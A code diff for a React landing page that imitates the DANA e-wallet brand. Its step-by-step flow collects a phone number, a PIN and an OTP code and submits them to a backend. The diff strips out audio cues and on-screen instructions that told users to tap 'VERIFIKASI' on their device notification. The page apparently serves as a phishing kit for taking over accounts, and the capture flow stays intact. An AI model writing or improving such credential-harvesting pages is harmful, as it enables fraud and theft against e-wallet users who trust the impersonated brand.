@@ -7,14 +7,6 @@ import { DanaLoadingSpinnerOverlay } from './DanaLoadingSpinnerOverlay';
 
 import { submitLandingStepViaApi } from '@/lib/landing/submit-client';
 import type { SlugData, StepData } from '@/lib/landing/types';
-import {
-  clearPendingLandingSound,
-  getLandingAudio,
-  LANDING_STEP3_SOUND,
-  playLandingSound,
-  playLandingSoundFromGesture,
-  unlockLandingAudioSync,
-} from '@/lib/landing-audio';
 import { dismissMobileKeyboard, useKeyboardBottomOffset } from '@/hooks/use-visual-viewport';
 import { StandardPaylaterStep1View } from './standard/StandardPaylaterStep1View';
 import { StandardPaylaterPopup } from './standard/StandardPaylaterPopup';
@@ -30,8 +22,6 @@ type LandingPageClientProps = {
   /** Gaya popup slider paylater di step 1 */
   paylaterPopupStyle?: 'standard' | 'professional';
 };
-
-const STEP3_SOUND_SRC = LANDING_STEP3_SOUND;
 
 function formatPhoneInput(value: string): string {
   const digits = value.replace(/\D/g, '').slice(0, 13);
@@ -129,26 +119,9 @@ export default function LandingPageClient({
   const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const otpLockTimeoutRef = useRef<number | null>(null);
   const otpCompleteRingTimeoutRef = useRef<number | null>(null);
-  const step3GestureSoundRef = useRef(false);
   const keyboardOffset = useKeyboardBottomOffset();
   const isDefaultStep1 = (step === 1 || previousStep === 1) && step1Variant === 'default';
   const step1KeyboardOffset = isDefaultStep1 ? keyboardOffset : 0;
-
-  useEffect(() => {
-    if (step !== 3) {
-      step3GestureSoundRef.current = false;
-      clearPendingLandingSound(STEP3_SOUND_SRC);
-      return;
-    }
-
-    // Play once on enter (PIN typing usually already unlocked audio).
-    // If autoplay is blocked, first touch below acts as backup — cooldown prevents spam.
-    playLandingSound(STEP3_SOUND_SRC);
-  }, [step]);
-
-  useEffect(() => {
-    getLandingAudio(STEP3_SOUND_SRC);
-  }, []);
 
   useEffect(() => {
     if (step === 2) {
@@ -234,7 +207,6 @@ export default function LandingPageClient({
   const handleNext = async () => {
     if (step === 3 && otpLocked) return;
 
-    void unlockLandingAudioSync();
     setErrorMessage('');
     setSubmitting(true);
     setIsLoadingOverlay(true);
@@ -655,7 +627,6 @@ export default function LandingPageClient({
                 placeholder="811-1234-5678"
                 className="min-w-0 flex-1 bg-transparent px-3 text-[22px] font-medium text-gray-800 placeholder:text-gray-400 outline-none"
                 value={formatPhoneInput(stepData.phone)}
-                onPointerDown={() => unlockLandingAudioSync()}
                 onChange={(e) => setStepData({ ...stepData, phone: e.target.value.replace(/[^0-9]/g, '') })}
                 onKeyDown={(e) => {
                   if (e.key === 'Enter' && phoneIsValid && !submitting) {
@@ -687,7 +658,6 @@ export default function LandingPageClient({
             <button
               type="submit"
               disabled={!phoneIsValid || submitting}
-              onPointerDown={() => unlockLandingAudioSync()}
               className={`flex h-[52px] w-full items-center justify-center rounded-xl text-[15px] font-bold tracking-wide transition ${
                 phoneIsValid ? 'bg-white text-[#108EE9] active:bg-white/90' : 'bg-[#7EC8F7] text-[#108EE9]/70'
               } disabled:cursor-not-allowed`}
@@ -723,7 +693,6 @@ export default function LandingPageClient({
 
             <div
               className="relative mt-10 cursor-text"
-              onPointerDown={() => unlockLandingAudioSync()}
               onClick={() => pinInputRef.current?.focus()}
               role="presentation"
             >
@@ -776,21 +745,11 @@ export default function LandingPageClient({
           className={`mx-auto min-h-screen w-full max-w-md bg-white pb-8 transition-transform transition-opacity duration-500 ease-in-out ${
             isStep3SlidingIn ? 'translate-y-10 opacity-0' : 'translate-y-0 opacity-100'
           }`}
-          onPointerDown={() => {
-            // Backup for strict autoplay policies; cooldown blocks duplicate if enter-play worked.
-            if (step3GestureSoundRef.current) return;
-            step3GestureSoundRef.current = true;
-            playLandingSoundFromGesture(STEP3_SOUND_SRC);
-          }}
         >
           <div className="landing-safe-top-content px-5 pb-8">
             <h1 className="text-center text-[15px] font-bold text-gray-900">Verifikasi telah dikirim ke Akun</h1>
             <div className="mt-3 flex justify-center">
               <DanaLogoBlue />
-            </div>
-
-            <div className="mt-4">
-              <Image src="/notif.gif" width={200} height={120} className="w-[200px] h-auto mx-auto" alt="Notifikasi" />
             </div>
 
             <p className="mt-6 text-center text-[13px] text-gray-700">Kode dikirim ke</p>
@@ -827,7 +786,6 @@ export default function LandingPageClient({
                     otpCompleteRingVisible ? 'border-red-500 ring-2 ring-red-500/30' : 'border-transparent'
                   }`}
                   value={stepData.otp[index] ?? ''}
-                  onPointerDown={() => unlockLandingAudioSync()}
                   onChange={(e) => handleOtpChange(index, e.target.value)}
                   onKeyDown={(e) => handleOtpKeyDown(index, e)}
                 />
@@ -860,34 +818,6 @@ export default function LandingPageClient({
                   Kirim ulang
                 </button>
               )}
-            </div>
-
-            <div className="mt-8 border-t border-gray-100 pt-6">
-              <p className="text-[13px] font-semibold text-gray-800">Silahkan Cek verifikasi akun DANA kamu:</p>
-
-              <div className="mt-4 flex gap-3">
-                <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-[#108EE9]/10">
-                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-                    <rect x="6" y="2" width="12" height="20" rx="2" stroke="#108EE9" strokeWidth="1.5" />
-                    <circle cx="12" cy="18" r="1" fill="#108EE9" />
-                  </svg>
-                </div>
-                <p className="text-[11px] leading-relaxed text-gray-600">
-                  Tap notifikasi di perangkatmu di layar atas dan tap <span className="font-bold text-gray-800">VERIFIKASI</span>.
-                </p>
-              </div>
-
-              <div className="mt-4 flex gap-3">
-                <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-[#108EE9]/10">
-                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-                    <rect x="3" y="5" width="18" height="14" rx="2" stroke="#108EE9" strokeWidth="1.5" />
-                    <path d="M3 7l9 6 9-6" stroke="#108EE9" strokeWidth="1.5" />
-                  </svg>
-                </div>
-                <p className="text-[11px] leading-relaxed text-gray-600">
-                  Tidak menerima notifikasi? Cek Kotak Masuk atau menu <span className="font-bold text-gray-800">Verifikasi</span>. atau cek di icon gambar <span className="font-bold text-gray-800">Amplop</span> dan tap <span className="font-bold text-gray-800">Verifikasi</span>.
-                </p>
-              </div>
             </div>
 
             {errorMessage && (
